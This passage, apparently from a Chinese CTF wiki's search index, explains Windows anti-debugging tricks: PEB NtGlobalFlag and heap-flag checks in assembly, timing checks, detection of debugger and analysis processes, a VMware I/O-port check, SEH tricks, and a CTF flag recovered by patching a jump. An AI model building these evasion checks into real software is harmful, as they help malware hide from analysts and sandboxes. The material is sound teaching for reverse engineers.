__readfsdword ( 48 ) + 0x68 ) & 0x70 ; } 0x68 \u662fPEB\u7684 NtGlobalFlag \u5b57\u6bb5\u5bf9\u5e94\u504f\u79fb\u503c. 0x70 \u662f FLG_HEAP_ENABLE_TAIL_CHECK (0x10) , FLG_HEAP_ENABLE_FREE_CHECK (0x20) \u548c FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u8fd9\u4e09\u4e2a\u6807\u5fd7","title":"NtGlobalFlag"},{"location":"reverse/anti-debug/example/#checkremotedebuggerpresent","text":"/* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } \u8fd9\u91cc\u6211\u987a\u4fbf\u5728\u6ce8\u91ca\u91cc\u5217\u51fa\u4e86 CheckRemoteDebuggerPresent() \u8fd9\u4e2aAPI\u7684\u51fd\u6570\u539f\u578b. \u5982\u679c\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728, \u4f1a\u5c06 pbDebuggerPresent \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c. \u6839\u636e\u5176\u503c\u68c0\u6d4b\u8c03\u8bd5\u5668( CheckRemoteDebuggerPresent() \u7bc7)","title":"CheckRemoteDebuggerPresent"},{"location":"reverse/anti-debug/example/#_2","text":"v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) // \u7761\u7720 Sleep ( 1u ); v16 = 1000 ; if ( GetTickCount () - v13 > 1000 ) // 5. \u68c0\u6d4b\u65f6\u95f4\u5dee { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } GetTickCount \u4f1a\u8fd4\u56de\u542f\u52a8\u5230\u73b0\u5728\u7684\u6beb\u79d2\u6570, \u5faa\u73af\u91cc\u5149\u662f sleep(1) \u5c31\u8fdb\u884c\u4e86100\u6b21, \u4e5f\u5c31\u662f100\u6beb\u79d2. \u4e24\u6b21\u5f97\u5230\u7684\u65f6\u95f4\u4f5c\u5dee\u5982\u679c\u5927\u4e8e1000\u6beb\u79d2, \u65f6\u5dee\u660e\u663e\u5927\u4e8e\u6240\u8017\u7684\u65f6\u95f4, \u4e5f\u5c31\u95f4\u63a5\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5.","title":"\u65f6\u95f4\u5dee\u68c0\u6d4b"},{"location":"reverse/anti-debug/example/#processmonitor","text":"lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) - 1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } \u8fd9\u91cc\u901a\u8fc7\u68c0\u6d4b\u8bbe\u5907\u6587\u4ef6 \\\\\\\\.\\\\Global\\\\ProcmonDebugLogger \u6765\u68c0\u6d4b ProcessMonitor","title":"ProcessMonitor"},{"location":"reverse/anti-debug/example/#_3","text":"\u8fd9\u91cc\u901a\u8fc7\u6267\u884c sub_401130() \u51fd\u6570\u6765\u68c0\u6d4b\u8fdb\u7a0b, \u5e76\u6839\u636e\u68c0\u6d4b\u5230\u7684\u4e0d\u540c\u8fdb\u7a0b, \u8fd4\u56de\u76f8\u5e94\u7684\u503c. v11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } \u6211\u4eec\u5c31\u6765\u770b\u4e00\u4e0b sub_401130() \u51fd\u6570 signed int sub_401130 () { PROCESSENTRY32 pe ; // [sp+0h] [bp-138h]@1 HANDLE hSnapshot ; // [sp+130h] [bp-8h]@1 int i ; // [sp+134h] [bp-4h]@1 pe . dwSize = 296 ; memset ( & pe . cntUsage , 0 , 0x124u ); hSnapshot = CreateToolhelp32Snapshot ( 2u , 0 ); for ( i = Process32First ( hSnapshot , & pe ); i == 1 ; i = Process32Next ( hSnapshot , & pe ) ) { if ( ! _stricmp ( pe . szExeFile , \"ollydbg.exe\" ) ) return 1 ; if ( ! _stricmp ( pe . szExeFile , \"ImmunityDebugger.exe\" ) ) return 2 ; if ( ! _stricmp ( pe . szExeFile , \"idaq.exe\" ) ) return 3 ; if ( ! _stricmp ( pe . szExeFile , \"Wireshark.exe\" ) ) return 4 ; } return 0 ; } \u8fd9\u91cc\u4f7f\u7528\u4e86API: CreateToolhelp32Snapshot \u6765\u83b7\u53d6\u5f53\u524d\u7684\u8fdb\u7a0b\u4fe1\u606f. \u5e76\u5728for\u5faa\u73af\u91cc\u4f9d\u6b21\u6bd4\u5bf9. \u5982\u679c\u627e\u5230\u6307\u5b9a\u7684\u8fdb\u7a0b\u540d, \u5c31\u76f4\u63a5\u8fd4\u56de\u76f8\u5e94\u7684\u503c. \u7136\u540e\u6839\u636e\u8fd4\u56de\u503c\u8df3\u8f6c\u5230\u4e0d\u540c\u7684\u5206\u652f\u91cc.","title":"\u68c0\u6d4b\u8fdb\u7a0b\u540d"},{"location":"reverse/anti-debug/example/#vmware","text":"\u68c0\u6d4bVMware\u4e5f\u662f\u68c0\u6d4b\u4e00\u4e9b\u7279\u5f81. \u6839\u636e\u68c0\u6d4b\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad. if ( sub_401240 () == 1 ) // 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } \u6765\u770b sub_401240() \u51fd\u6570. signed int sub_401240 () { unsigned __int32 v0 ; // eax@1 v0 = __indword ( 0x5658u ); return 1 ; } \u8fd9\u662fVMware\u7684\u4e00\u4e2a\"\u540e\u95e8\"I/O\u7aef\u53e3, 0x5658 = \"VX\" . \u5982\u679c\u7a0b\u5e8f\u5728VMware\u5185\u8fd0\u884c, \u7a0b\u5e8f\u4f7f\u7528 In \u6307\u4ee4\u901a\u8fc7 0x5658 \u7aef\u53e3\u8bfb\u53d6\u6570\u636e\u65f6, EBX \u5bc4\u5b58\u5668\u7684\u503c\u5c31\u4f1a\u53d8\u4e3a 0x564D5868 ( 0x564D5868 == \"VMXh\" ) \u770bIDA\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u5f88\u76f4\u89c2\u5730\u4f53\u73b0\u8fd9\u70b9, \u6211\u4eec\u770b\u6c47\u7f16\u4ee3\u7801\u5c31\u6e05\u695a\u4e86 .text: 0040127 A push edx .text: 0040127 B push ecx .text: 0040127 C push ebx .text: 0040127 D mov eax , 564 D5868h // < ------ .text: 00401282 mov ebx , 0 .text: 00401287 mov ecx , 0 Ah .text: 0040128 C mov edx , 5658 h // < ------ .text: 00401291 in eax , dx .text: 00401292 pop ebx .text: 00401293 pop ecx .text: 00401294 pop edx \u66f4\u591a\u9605\u8bfb: E-cards don?t like virtual environments","title":"\u68c0\u6d4bVMware"},{"location":"reverse/anti-debug/example/#seh","text":"v17 = 1 ; v20 = 1 ; v12 = 0 ; v19 = 1 / 0 ; // 9. SEH ms_exc . registration . TryLevel = - 2 ; printf ( \"But detected Debugged. \\n \" ); exit ( 1 ); \u63a5\u4e0b\u6765\u8fd9\u4e00\u6bb5, \u5f88\u5947\u602a\u4e0d\u662f\u5417. \u8fd9\u91cc v19 = 1 / 0; \u660e\u663e\u662f\u4e0d\u5408\u5e38\u7406\u7684, \u4f1a\u4ea7\u751f\u4e00\u4e2a\u9664\u96f6\u5f02\u5e38. \u800c\u540e\u9762\u7684 ms_exc.registration.TryLevel = -2; \u8fd9\u662f\u89e3\u9664\u5f02\u5e38, TryLevel=TRYLEVEL_NONE (-2) . \u6765\u770b\u6c47\u7f16\u4ee3\u7801. .text:004015B8 mov [ebp+var_88], 1 .text:004015C2 mov [ebp+var_7C], 1 .text:004015C9 mov [ebp+var_9C], 0 .text:004015D3 mov [ebp+ms_exc.registration.TryLevel], 0 .text:004015DA mov eax, [ebp+var_7C] .text:004015DD cdq .text:004015DE idiv [ebp+var_9C] .text:004015E4 mov [ebp+var_80], eax .text:004015E7 mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh .text:004015EE jmp short loc_40160A \u5728\u8fd9\u91cc\u7684 idiv [ebp+var_9C] \u89e6\u53d1\u5f02\u5e38\u540e\u5c31\u7531\u7a0b\u5e8f\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570\u63a5\u7ba1, \u800c\u5982\u679c\u6ca1\u6709\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u8bbe\u4e0b\u65ad\u70b9\u7684\u8bdd, \u7a0b\u5e8f\u5c31\u5bb9\u6613\u8dd1\u98de.","title":"SEH"},{"location":"reverse/anti-debug/example/#flag","text":"\u4f46\u6574\u4e2a\u770b\u4e0b\u4e86. \u600e\u4e48\u611f\u89c9\u5173flag\u4e00\u70b9\u4e8b\u90fd\u6ca1\u6709\u4e86\u5462? \u8fd8\u6709\u6ca1\u6709\u8bb0\u8d77\u4e4b\u524d\u5728\u5b57\u7b26\u4e32\u7a97\u53e3\u770b\u5230\u7684\u7591\u4f3c\u662f\u90a3\u4e2a\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32? \u5b9e\u9645\u4e0a\u7531\u4e8eIDA\u53cd\u7f16\u8bd1\u7684\u9650\u5236, \u4f7f\u5f97\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u6b63\u786e. \u6bd4\u5982\u5728\u6700\u540e\u4e00\u6bb5\u7684 printf(\"But detected Debugged.\\n\"); \u8fd9\u91cc, \u6211\u4eec\u6765\u770b\u5177\u4f53\u7684\u6c47\u7f16\u4ee3\u7801. .text: 00401627 call sub_4012E0 .text: 0040162 C movzx eax , ax .text: 0040162 F mov [ ebp + var_A8 ], eax .text: 00401635 cmp [ ebp + var_A8 ], 0 // < ------ .text: 0040163 C jz short loc_401652 // < ------ .text: 0040163 E push offset aButDetectedD_2 ; \"But detected Debugged.\\n\" .text : 00401643 call _printf .text: 00401648 add esp , 4 .text: 0040164 B push 1 ; int .text : 0040164 D call _exit \u5b9e\u9645\u4e0a\u8fd9\u4e00\u6bb5\u4ee3\u7801\u5e76\u6ca1\u6709\u88abIDA\u53cd\u7f16\u8bd1\u51fa\u6765. \u800c loc_401652 \u4f4d\u7f6e\u5219\u662f\u4e00\u4e32\u4ee3\u7801, \u4eae\u70b9\u5728\u4e8e\u4f7f\u7528\u4e86\u4e00\u4e2a MessageBoxA \u7684\u51fd\u6570. \u800c\u4e14\u51fd\u6570\u53c2\u6570\u4e4b\u4e00\u5c31\u662f\u6211\u4eec\u7684\u5f85\u89e3\u5bc6flag. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8f93\u5165 I have a pen. \u540e, \u5728 if ( !v22 ) \u8df3\u8f6c\u7684\u6c47\u7f16\u4ee3\u7801\u90e8\u5206, \u5c06\u5176\u624b\u52a8\u6539\u4e3a\u8df3\u8f6c\u5230flag\u89e3\u5bc6\u53ca\u5f39\u51fa messagebox \u7684\u90e8\u5206\u8fd0\u884c, \u8ba9\u7a0b\u5e8f\u81ea\u5df1\u5e2e\u5fd9\u89e3\u5bc6\u5e76\u8f93\u51fa, \u5c31\u53ef\u4ee5\u4e86. \u64cd\u4f5c\u5982\u4e0b\u56fe\u6240\u793a: \u8fd9\u91cc\u662f\u8f93\u5165 I have a pen. \u540e\u7684\u8df3\u8f6c\u90e8\u5206, \u56e0\u4e3a\u6b63\u5e38\u8df3\u8f6c\u5230\u7684\u90e8\u5206, \u5168\u662f\u4e00\u4e9b\u68c0\u6d4b\u8c03\u8bd5\u7684\u5185\u5bb9, \u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8df3\u5230\u4ee3\u7801\u89e3\u5bc6\u7684\u90e8\u5206. \u4e5f\u5c31\u662f 00401663 \u7684\u4f4d\u7f6e. \u5728 00401663 \u4ee5\u4e0a\u7684 mov-cmp-jnz \u4e5f\u662f\u4e00\u4e2a\u9a8c\u8bc1\u90e8\u5206, \u5c31\u4e0d\u7ba1\u4e86, \u76f4\u63a5\u8df3\u5230 00401663 \u8fd9\u91cc\u7684 mov ecx, 7 \u8fd9\u91cc\u8fd0\u884c\u89e3\u5bc6\u4ee3\u7801, \u5e76\u987a\u7740\u6267\u884c MessageBoxA() \u5f39\u51fa\u6d88\u606f\u6846, \u62ff\u5230flag","title":"\u83b7\u53d6flag"},{"location":"reverse/anti-debug/heap-flags/","text":"\u5173\u4e8eHeap flags \u00b6 Heap flags \u5305\u542b\u6709\u4e24\u4e2a\u4e0e NtGlobalFlag \u4e00\u8d77\u521d\u59cb\u5316\u7684\u6807\u5fd7: Flags \u548c ForceFlags . \u8fd9\u4e24\u4e2a\u5b57\u6bb5\u7684\u503c\u4e0d\u4ec5\u4f1a\u53d7\u8c03\u8bd5\u5668\u7684\u5f71\u54cd, \u8fd8\u4f1a\u7531windows\u7248\u672c\u800c\u4e0d\u540c, \u5b57\u6bb5\u7684\u4f4d\u7f6e\u4e5f\u53d6\u51b3\u4e8ewindows\u7684\u7248\u672c. Flags\u5b57\u6bb5: \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, Flags \u4f4d\u4e8e\u5806\u7684 0x0C \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x40 \u504f\u79fb\u5904. \u572864\u4f4dWindows XP\u4e2d, Flags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x14 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x70 \u504f\u79fb\u5904. ForceFlags\u5b57\u6bb5: \u572832\u4f4dWindows NT, Windows 2000\u548cWindows XP\u4e2d, ForceFlags \u4f4d\u4e8e\u5806\u7684 0x10 \u504f\u79fb\u5904. \u572832\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u4f4d\u4e8e 0x44 \u504f\u79fb\u5904. \u572864\u4f4dWindows XP\u4e2d, ForceFlags \u5b57\u6bb5\u4f4d\u4e8e\u5806\u7684 0x18 \u504f\u79fb\u5904, \u800c\u572864\u4f4dWindows Vista\u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u4e2d, \u5b83\u5219\u662f\u4f4d\u4e8e 0x74 \u504f\u79fb\u5904. \u5728\u6240\u6709\u7248\u672c\u7684Windows\u4e2d, Flags \u5b57\u6bb5\u7684\u503c\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a HEAP_GROWABLE(2) , \u800c ForceFlags \u5b57\u6bb5\u6b63\u5e38\u60c5\u51b5\u90fd\u8bbe\u4e3a 0 . \u7136\u800c\u5bf9\u4e8e\u4e00\u4e2a32\u4f4d\u8fdb\u7a0b(64\u4f4d\u7a0b\u5e8f\u4e0d\u4f1a\u6709\u6b64\u56f0\u6270), \u8fd9\u4e24\u4e2a\u9ed8\u8ba4\u503c, \u90fd\u53d6\u51b3\u4e8e\u5b83\u7684\u5bbf\u4e3b\u8fdb\u7a0b(host process)\u7684 subsystem \u7248\u672c(\u8fd9\u91cc\u4e0d\u662f\u6307\u6240\u8bf4\u7684\u6bd4\u5982win10\u7684linux\u5b50\u7cfb\u7edf). \u53ea\u6709\u5f53 subsystem \u5728 3.51 \u53ca\u66f4\u9ad8\u7684\u7248\u672c, \u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c\u624d\u5982\u524d\u6240\u8ff0. \u5982\u679c\u662f\u5728 3.10-3.50 \u7248\u672c\u4e4b\u95f4, \u5219\u4e24\u4e2a\u5b57\u6bb5\u7684 HEAP_CREATE_ALIGN_16 (0x10000) \u90fd\u4f1a\u88ab\u8bbe\u7f6e. \u5982\u679c\u7248\u672c\u4f4e\u4e8e 3.10 , \u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u6587\u4ef6\u5c31\u6839\u672c\u4e0d\u4f1a\u88ab\u8fd0\u884c. \u5982\u679c\u67d0\u64cd\u4f5c\u5c06 Flags \u548c ForgeFlags \u5b57\u6bb5\u7684\u503c\u5206\u522b\u8bbe\u4e3a 2 \u548c 0 , \u4f46\u662f\u5374\u672a\u5bf9 subsystem \u7248\u672c\u8fdb\u884c\u68c0\u67e5, \u90a3\u4e48\u5c31\u53ef\u4ee5\u8868\u660e\u8be5\u52a8\u4f5c\u662f\u4e3a\u4e86\u9690\u85cf\u8c03\u8bd5\u5668\u800c\u8fdb\u884c\u7684. \u5f53\u8c03\u8bd5\u5668\u5b58\u5728\u65f6, \u5728 Windows NT , Windows 2000 \u548c32\u4f4d Windows XP \u7cfb\u7edf\u4e0b, Flags \u5b57\u6bb5\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7: HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_SKIP_VALIDATION_CHECKS ( 0x10000000 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u572864\u4f4d Windows XP \u7cfb\u7edf, Windows Vista \u53ca\u66f4\u65b0\u7684\u7cfb\u7edf\u7248\u672c, Flags \u5b57\u6bb5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7(\u5c11\u4e86 HEAP_SKIP_VALIDATION_CHECKS (0x10000000) ): HEAP_GROWABLE ( 2 ) HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u800c\u5bf9\u4e8e ForgeFlags \u5b57\u6bb5, \u6b63\u5e38\u60c5\u51b5\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7: HEAP_TAIL_CHECKING_ENABLED ( 0x20 ) HEAP_FREE_CHECKING_ENABLED ( 0x40 ) HEAP_VALIDATE_PARAMETERS_ENABLED ( 0x40000000 ) \u56e0\u4e3a NtGlobalFlag \u6807\u5fd7\u7684\u5173\u7cfb, heap \u4e5f\u4f1a\u8bbe\u7f6e\u4e00\u4e9b\u6807\u5fd7\u4f4d \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_TAIL_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7. \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e FLG_HEAP_ENABLE_FREE_CHECK \u6807\u5fd7. \u5982\u679c\u5728 NtGlobalFlag \u5b57\u6bb5\u4e2d\u6709\u8bbe\u7f6e FLG_HEAP_VALIDATE_PARAMETERS \u6807\u5fd7, \u90a3\u4e48\u5728 heap \u5b57\u6bb5\u4e2d\u5c31\u4f1a\u8bbe\u7f6e HEAP_VALIDATE_PARAMETERS_ENABLED \u6807\u5fd7(\u5728 Windows NT \u548c Windows 2000 \u4e2d\u8fd8\u4f1a\u8bbe\u7f6e HEAP_CREATE_ALIGN_16 (0x10000) \u6807\u5fd7). heap flags \u540c\u6837\u4e5f\u5982\u4e0a\u8282\u7684 NtGlobalFlag \u90a3\u6837, \u4e0d\u8fc7\u5b83\u53d7\u5230\u6ce8\u518c\u8868 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<filename> \u4f4d\u7f6e\u7684 PageHeapFlags\" \u952e\u7684\u63a7\u5236. \u83b7\u53d6heap\u4f4d\u7f6e \u00b6 \u6709\u591a\u79cd\u65b9\u6cd5\u80fd\u83b7\u77e5 heap \u7684\u4f4d\u7f6e, \u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f kernel32 \u7684 GetProcessHeap() \u51fd\u6570, \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u768432\u4f4d\u6c47\u7f16\u4ee3\u7801\u6765\u68c0\u6d4b32\u4f4d\u73af\u5883(\u5b9e\u9645\u4e0a\u5c31\u6709\u4e00\u4e9b\u58f3\u907f\u514d\u4f7f\u7528\u8be5api\u51fd\u6570, \u76f4\u63a5\u67e5\u8be2PEB): mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base \u6216\u4f7f\u7528\u4ee5\u4e0b64\u4f4d\u4ee3\u7801\u6765\u68c0\u6d4b64\u4f4d\u73af\u5883 push 60 h pop rsi gs: lodsq ;Process Environment Block mov eax , [ rax + 30 h ] ;get process heap base \u6216\u4f7f\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov eax , [ eax + 1030 h ] ;get process heap base \u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528 kernel32 \u7684 GetProcessHeaps() \u51fd\u6570, \u5176\u5b9e\u5b83\u53ea\u662f\u7b80\u5355\u7684\u8f6c\u7ed9\u4e86 ntdll \u7684 RtlGetProcessHeaps() \u51fd\u6570, \u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u5c5e\u4e8e\u5f53\u524d\u8fdb\u7a0b\u7684\u5806\u7684\u6570\u7ec4, \u800c\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5806, \u5c31\u8ddf kernel32 \u7684 GetProcessHeap() \u51fd\u6570\u6240\u8fd4\u56de\u7684\u662f\u4e00\u6837\u7684. \u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883\u6765\u5b9e\u73b0: push 30 h pop esi fs: lodsd ;Process Environment Block ;get process heaps list base mov esi , [ esi + eax + 5 ch ] lodsd \u540c\u4e0a, \u752864\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883\u7684\u4ee3\u7801\u662f: push 60 h pop rsi gs: lodsq ;Process Environment Block ;get process heaps list base mov esi , [ rsi * 2 + rax + 20 h ] lodsd \u6216\u4f7f\u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindow\u73af\u5883: mov eax , fs :[ 30 h ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov esi , [ eax + 10 f0h ] ;get process heaps list base lodsd \u68c0\u6d4bFlags\u5b57\u6bb5 \u00b6 \u90a3\u4e48\u663e\u7136, \u68c0\u6d4b\u8c03\u8bd5\u5668\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u68c0\u6d4b\u90a3\u51e0\u4e2a Flags \u548c ForgeFlags \u7684\u6807\u5fd7\u4f4d\u5165\u624b. \u5148\u770b Flags \u5b57\u6bb5\u7684\u68c0\u6d4b\u4ee3\u7801, \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;neither HEAP_CREATE_ALIGN_16 ;nor HEAP_SKIP_VALIDATION_CHECKS and eax , 0 effeffffh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000062 h je being_debugged 32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 0 ch ] ;Flags ;not HEAP_SKIP_VALIDATION_CHECKS bswap eax and al , 0 efh ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED ;reversed by bswap cmp eax , 62000040 h je being_debugged 64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 sbb rax , rax and al , 0 a4h ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 70 h ], 40000062 h ;Flags je being_debugged \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883: push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block ;64-bit Process Environment Block ;follows 32-bit Process Environment Block mov ah , 10 h mov ebx , [ ebx + eax ] ;get process heap base call GetVersion cmp al , 6 sbb eax , eax and al , 0 a4h ;Flags ;HEAP_GROWABLE ;+ HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ ebx + eax + 70 h ], 40000062 h je being_debugged \u5982\u679c\u662f\u76f4\u63a5\u901a\u8fc7 KUSER_SHARED_DATA \u7ed3\u6784\u7684 NtMajorVersion \u5b57\u6bb5(\u4f4d\u4e8e2G\u7528\u6237\u7a7a\u95f4\u7684 0x7ffe026c \u504f\u79fb\u5904)\u83b7\u53d6\u8be5\u503c(\u5728\u6240\u670932\u4f4d/64\u4f4d\u7248\u672c\u7684Windows\u90fd\u53ef\u4ee5\u83b7\u53d6\u8be5\u503c), \u53ef\u4ee5\u8fdb\u4e00\u6b65\u6df7\u6dc6 kernel32 \u7684 GetVersion() \u51fd\u6570\u8c03\u7528\u64cd\u4f5c. \u68c0\u6d4bForgeFlags\u5b57\u6bb5 \u00b6 \u5f53\u7136\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5c31\u662f\u68c0\u6d4b ForgeFlags \u5b57\u6bb5, \u4ee5\u4e0b\u662f32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dWindows\u73af\u5883, subsystem \u7248\u672c\u5728 3.10-3.50 \u4e4b\u95f4: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base mov eax , [ eax + ebx + 10 h ] ;ForceFlags ;not HEAP_CREATE_ALIGN_16 btr eax , 10 h ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp eax , 40000060 h je being_debugged 32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4dwindows\u73af\u5883, \u4e14 subsystem \u4e3a 3.51 \u53ca\u66f4\u9ad8\u7248\u672c: call GetVersion cmp al , 6 cmc sbb ebx , ebx and ebx , 34 h mov eax , fs :[ 30 h ] ;Process Environment Block mov eax , [ eax + 18 h ] ;get process heap base ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp [ eax + ebx + 10 h ], 40000060 h je being_debugged 64\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883(64\u4f4d\u8fdb\u7a0b\u4e0d\u5fc5\u53d7 subsystem \u7248\u672c\u56f0\u6270): push 60 h pop rsi gs: lodsq ;Process Environment Block mov ebx , [ rax + 30 h ] ;get process heap base call GetVersion cmp al , 6 sbb rax , rax and al , 0 a4h ;ForceFlags ;HEAP_TAIL_CHECKING_ENABLED ;+ HEAP_FREE_CHECKING_ENABLED ;+ HEAP_VALIDATE_PARAMETERS_ENABLED cmp d [ rbx + rax + 74 h ], 40000060 h je being_debugged \u752832\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4dwindows\u73af\u5883: call GetVersion cmp al , 6 push 30 h pop eax mov ebx , fs :[ eax ] ;Process Environment Block 